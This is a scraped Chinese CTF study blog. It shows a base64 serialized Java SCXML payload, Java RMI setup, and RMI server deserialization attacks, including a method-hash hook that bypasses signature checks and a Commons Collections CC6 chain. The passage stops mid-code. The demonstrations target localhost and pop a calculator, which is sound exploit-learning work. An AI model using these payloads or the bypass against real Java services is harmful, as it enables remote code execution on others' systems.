class="comment">rO0ABXNyABVjb20ubjFnaHQuSW52b2tlckltcGyTOSc2zqCsvwIAA0wAAW90ACpMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9pbnZva2UvSW52b2tlcjtMAAZwYXJhbXN0AA9MamF2YS91dGlsL01hcDtMAAZzb3VyY2V0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyADNvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLmludm9rZS5TaW1wbGVTQ1hNTEludm9rZXIAAAAAAAAAAQIABVoACWNhbmNlbGxlZEwAC2V2ZW50UHJlZml4cQB+AANMAAhleGVjdXRvcnQAKUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL1NDWE1MRXhlY3V0b3I7TAAQcGFyZW50U0NJbnN0YW5jZXQAJkxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL1NDSW5zdGFuY2U7TAANcGFyZW50U3RhdGVJZHEAfgADeHAAcHBzcgAkb3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5TQ0luc3RhbmNlAAAAAAAAAAICAApMAAtjb21wbGV0aW9uc3EAfgACTAAIY29udGV4dHNxAH4AAkwACWV2YWx1YXRvcnQAJUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0V2YWx1YXRvcjtMAAhleGVjdXRvcnEAfgAGTAAJaGlzdG9yaWVzcQB+AAJMABRpbml0aWFsU2NyaXB0Q29udGV4dHQAI0xvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0NvbnRleHQ7TAAOaW52b2tlckNsYXNzZXNxAH4AAkwACGludm9rZXJzcQB+AAJMABRub3RpZmljYXRpb25SZWdpc3RyeXQAMExvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL05vdGlmaWNhdGlvblJlZ2lzdHJ5O0wAC3Jvb3RDb250ZXh0cQB+AAt4cHNyACVqYXZhLnV0aWwuQ29sbGVjdGlvbnMkU3luY2hyb25pemVkTWFwG3P5CUtLOXsDAAJMAAFtcQB+AAJMAAVtdXRleHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4cQB+ABB4c3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgATeHNyADBvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLmVudi5qZXhsLkpleGxFdmFsdWF0b3IAAAAAAAAAAQIAAloAEGpleGxFbmdpbmVTaWxlbnRaABBqZXhsRW5naW5lU3RyaWN0eHAAAHNyACdvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLlNDWE1MRXhlY3V0b3IAAAAAAAAAAQIACFoACXN1cGVyU3RlcEwADWN1cnJlbnRTdGF0dXN0ACJMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9TdGF0dXM7TAANZXJyb3JSZXBvcnRlcnQAKUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0Vycm9yUmVwb3J0ZXI7TAAPZXZlbnRkaXNwYXRjaGVydAArTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvRXZlbnREaXNwYXRjaGVyO0wAA2xvZ3QAIExvcmcvYXBhY2hlL2NvbW1vbnMvbG9nZ2luZy9Mb2c7TAAKc2NJbnN0YW5jZXEAfgAHTAAJc2VtYW50aWNzdAAqTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvU0NYTUxTZW1hbnRpY3M7TAAMc3RhdGVNYWNoaW5ldAAnTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvbW9kZWwvU0NYTUw7eHABc3IAIG9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU3RhdHVzAAAAAAAAAAECAAJMAAZldmVudHN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247TAAGc3RhdGVzdAAPTGphdmEvdXRpbC9TZXQ7eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhzcgARamF2YS51dGlsLkhhc2hTZXS6RIWVlri3NAMAAHhwdwwAAAAQP0AAAAAAAAB4cHBzcgArb3JnLmFwYWNoZS5jb21tb25zLmxvZ2dpbmcuaW1wbC5KZGsxNExvZ2dlckJmt5/gKqC8AgABTAAEbmFtZXEAfgADeHB0ACdvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLlNDWE1MRXhlY3V0b3JzcQB+AAlzcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+ACt4c3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgAteHBxAH4AHnNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AL3hwc3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgAxeHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AM3hzcgAub3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5Ob3RpZmljYXRpb25SZWdpc3RyeQAAAAAAAAABAgABTAAEcmVnc3EAfgACeHBzcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+ADd4cHNyADZvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLnNlbWFudGljcy5TQ1hNTFNlbWFudGljc0ltcGwAAAAAAAAAAQIAAkwABmFwcExvZ3EAfgAbTAAQdGFyZ2V0Q29tcGFyYXRvcnQAQExvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL3NlbWFudGljcy9UcmFuc2l0aW9uVGFyZ2V0Q29tcGFyYXRvcjt4cHNxAH4AJ3QAKG9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU0NYTUxTZW1hbnRpY3NzcgA+b3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5zZW1hbnRpY3MuVHJhbnNpdGlvblRhcmdldENvbXBhcmF0b3IAAAAAAAAAAQIAAHhwcHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AQHhwc3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgBCeHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4ARHhzcQB+ADVzcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+AEd4cHBzcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4dAAWaHR0cDovL2xvY2FsaG9zdDo4MDgxLw==</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>传参：</p>
<p><img src="https://i.imgur.com/nqWOAJ6.png"></p>
<p>弹出计算器，本地通；</p>
<p><img src="https://i.imgur.com/s9T9VSL.png"></p>
<h2 id="求甚解"><a href="#求甚解" class="headerlink" title="求甚解"></a>求甚解</h2><p>把 <code>JexlEvaluator</code> 的构造方法看成了 <code>protected</code>，想，如果这个 <code>evaluator</code> 使用者实例化不了那这个库是干什么用的；</p>
<p>这样题反射也能出，想起来学区块链 <code>web3.js</code> <strong>读</strong> <code>public</code> 变量也非要用 <code>getStorageAt()</code> 了，某种强迫症；</p>
<p>言归正传，一直在想这个库到底有什么用，乱看了一晚上，觉忘记睡了，刚刚上早八发现 <code>JexlEvaluator()</code> 是公有的； </p>
<p>我也不知道学习安全的该不该想这么多，事实上每次这样纠结很久最后都会发现自己是错的，而且得出的总是很浅显的结论；</p>
<p>但其实和 IDEA 大眼瞪小眼一整夜，收获也不能说是完全没有。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/18/2024-09-18-%E6%B7%BB%E7%A0%96%20Java%20%E5%A3%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/18/2024-09-18-%E6%B7%BB%E7%A0%96%20Java%20%E5%A3%B9/" class="post-title-link" itemprop="url">添砖 Java 壹</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-18 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-18T00:00:00+08:00">2024-09-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-19 21:18:13" itemprop="dateModified" datetime="2024-09-19T21:18:13+08:00">2024-09-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="添砖-Java-壹"><a href="#添砖-Java-壹" class="headerlink" title="添砖 Java 壹"></a>添砖 Java 壹</h1><p>该学点正经东西了，开始视奸学长博客，哈哈；</p>
<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>学习一下 RMI 的配置：</p>
<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p><strong>接口</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayGoodbye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>调用类</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inherit UnicastRemoteObject to export the remote class automatically</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteInterface</span> &#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="title function_">RemoteObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Hello My Friend&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">		<span class="keyword">return</span> name.getClass().getName();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayGoodbye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Bye&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>创建注册中心，绑定端口</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">    		<span class="comment">// start server</span></span><br><span class="line">    		LocateRegistry.createRegistry(PORT);</span><br><span class="line">    		<span class="comment">// bind object to port</span></span><br><span class="line">    		<span class="type">RemoteInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> mew <span class="title function_">RemoteObject</span><span class="params">()</span>;</span><br><span class="line">            Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/RemoteObject&quot;</span>, remoteObject);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    		e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h3><p><strong>调用接口</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="comment">// link registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(RMI_SERVER_IP, PORT);</span><br><span class="line">        System.out.println(Arrays.toString(registry.list()));</span><br><span class="line">        <span class="comment">// lookup by name</span></span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteInterface) registry.lookup(<span class="string">&quot;RemoteObject&quot;</span>);</span><br><span class="line">        System.out.println(stub.sayHello());</span><br><span class="line">        System.out.println(stub.sayGoodbye());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, URL);</span><br><span class="line"><span class="comment">// same as startup params [-Djava.rmi.server.codebase=&quot;&#123;URL&#125;&quot;]</span></span><br></pre></td></tr></table></figure>

<p>Client 调用的对象 <code>RemoteObject</code>如果在 Server 不存在，如果 Server 有设置 <code>java.rmi.server.codebase</code> ，则会从 <code>URL</code> 寻找字节码 <code>RemoteObject.class</code>；</p>
<h4 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">    System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="安全策略-1"><a href="#安全策略-1" class="headerlink" title="安全策略"></a>安全策略</h4><p>策略文件默认为：<code>$JAVA_HOME/jre/lib/security/java.policy</code>：</p>
<p>自定义策略文件 <strong>rmi.policy</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置管理器：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">    System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// same as startup params [-Djava.security.manager]</span></span><br></pre></td></tr></table></figure>

<p>指定策略：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, RemoteServer.class.getClassLoader().getResource(<span class="string">&quot;rmi.policy&quot;</span>).toString());</span><br><span class="line"><span class="comment">// same as startup params [-Djava.security.policy=rmi.policy]</span></span><br></pre></td></tr></table></figure>

<h3 id="Server-Attack"><a href="#Server-Attack" class="headerlink" title="Server Attack"></a>Server Attack</h3><h4 id="evil-params"><a href="#evil-params" class="headerlink" title="evil params"></a>evil params</h4><p>Client 端传 Object 对象给 Server，可以触发反序列化；</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// interface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIClass</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// attacked server</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">OBJECT_URL</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/Hello&quot;</span>;</span><br><span class="line">    <span class="comment">//    private static final String CODEBASE_URL = &quot;http://127.0.0.1:9999/&quot;;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">POLICY_FILE</span> <span class="operator">=</span> <span class="string">&quot;rmi.policy&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SERVER_START_MESSAGE</span> <span class="operator">=</span> <span class="string">&quot;SERVER STARTED&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">REGISTRY_PORT</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, AlreadyBoundException, RemoteException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, CODEBASE_URL);</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, RMIServer.class.getClassLoader().getResource(POLICY_FILE).toString());</span><br><span class="line">        LocateRegistry.createRegistry(REGISTRY_PORT);</span><br><span class="line">        <span class="type">RMIClass</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIClassImpl</span>();</span><br><span class="line">        Naming.bind(OBJECT_URL, remoteObject);</span><br><span class="line">        System.out.println(SERVER_START_MESSAGE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// attack client</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BINDED_NAME</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">IP</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(IP, PORT);</span><br><span class="line">        <span class="type">RMIClass</span> <span class="variable">stub</span> <span class="operator">=</span> (RMIClass) registry.lookup(BINDED_NAME);</span><br><span class="line">        System.out.println(Arrays.toString(registry.list()));</span><br><span class="line"><span class="comment">//        System.out.println(stub.sayHello());</span></span><br><span class="line">        System.out.println(stub.sayHello(getPayload()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// CC6 excute &quot;calc&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>CS 分别运行，弹计算器；</p>
<p>另外不难想到，只要 Server 端接收非基本类型，都会触发反序列化，这里有一个问题：</p>
<p>如果 Server 接收和 Client 发送的类型签名不一致，会抛出一个错误，如果将 Server 端的 <code>RMIClass</code> 接口改为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIClass</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Integer i)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>报错如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// remoteException occurred in server thread; nested exception is: </span></span><br><span class="line"><span class="comment">// 	java.rmi.UnmarshalException: unrecognized method hash: method not supported by remote object</span></span><br></pre></td></tr></table></figure>

<p>在远程对象上找不到对应签名的方法所致，在 <code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code> 下一下断点：</p>
<p>里面有这样一段：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ref.invoke((Remote) proxy, method, args, getMethodHash(method));</span><br></pre></td></tr></table></figure>

<p>这里进行远程调用，事实上 <code>getMethodHash</code> 是用来定位方法的，而且 Client 可以被攻击者完全控制，因此使用 hook 在这里把被 hash 的 <code>method</code> 改为和远程对象一致的方法即可绕过对签名的检验；</p>
<p>首先在 Client 端的 <code>RMIClass</code> 接口加上目标函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIClass</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Integer i)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>断点处栈的状况：</p>
<p><img src="https://i.imgur.com/NM9bXMF.png"></p>
<p>将 <code>method</code> 改为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIClass.class.getMethod(<span class="string">&quot;sayHello&quot;</span>, Integer.class)</span><br></pre></td></tr></table></figure>

<p>即可绕过校验触发反序列化，弹出计算器；</p>
<p>故而只要有传非基本类型参数的函数，Server 端都可以反序列化任意 payload，这一层相当于通杀了；</p>
<p>看到这了重新学一下 CC6；</p>
<h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// RCE transformer chain</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                    <span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                    <span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">                    <span class="keyword">new</span> <span 